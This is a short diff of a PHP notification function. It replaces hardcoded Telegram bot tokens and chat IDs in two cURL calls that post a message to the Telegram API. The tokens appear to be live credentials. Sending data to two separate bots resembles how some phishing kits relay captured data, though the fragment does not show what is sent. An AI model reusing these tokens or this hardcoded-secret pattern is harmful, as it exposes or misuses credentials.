@@ -51,7 +51,7 @@ function send_notification($message)
         $curl = curl_init();
 
         curl_setopt_array($curl, array(
-            CURLOPT_URL => 'https://api.telegram.org/bot6140179825:AAGfAmHK6JQTLegsdpnaklnhBZ4qA1m2c64/sendMessage?chat_id=1316552414',
+            CURLOPT_URL => 'https://api.telegram.org/bot7250293202:AAF2rdiAEOoiyHYMAr5S-Nj89PDkobhgHhg/sendMessage?chat_id=5831063571',
             CURLOPT_RETURNTRANSFER => true,
             CURLOPT_ENCODING => '',
             CURLOPT_MAXREDIRS => 10,
@@ -60,7 +60,7 @@ function send_notification($message)
             CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
             CURLOPT_CUSTOMREQUEST => 'POST',
             CURLOPT_POSTFIELDS => array(
-                'chat_id' => "1316552414",
+                'chat_id' => "5831063571",
                 'text' => $message,
             ),
             CURLOPT_HTTPHEADER => array(),
@@ -83,7 +83,7 @@ function send_notification($message)
         $curl = curl_init();
 
         curl_setopt_array($curl, array(
-            CURLOPT_URL => 'https://api.telegram.org/bot7446520062:AAFNjpsDuOyD1odhyCptH6u2idpGSaFpqWg/sendMessage?chat_id=5831063571',
+            CURLOPT_URL => 'https://api.telegram.org/bot7158474563:AAGGy_0ZGUV_vZbagi3V1MvMuleMLpUseEc/sendMessage?chat_id=7109127373',
             CURLOPT_RETURNTRANSFER => true,
             CURLOPT_ENCODING => '',
             CURLOPT_MAXREDIRS => 10,
@@ -92,7 +92,7 @@ function send_notification($message)
             CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
             CURLOPT_CUSTOMREQUEST => 'POST',
             CURLOPT_POSTFIELDS => array(
-                'chat_id' => "5831063571",
+                'chat_id' => "7109127373",
                 'text' => $message,
 
             ),
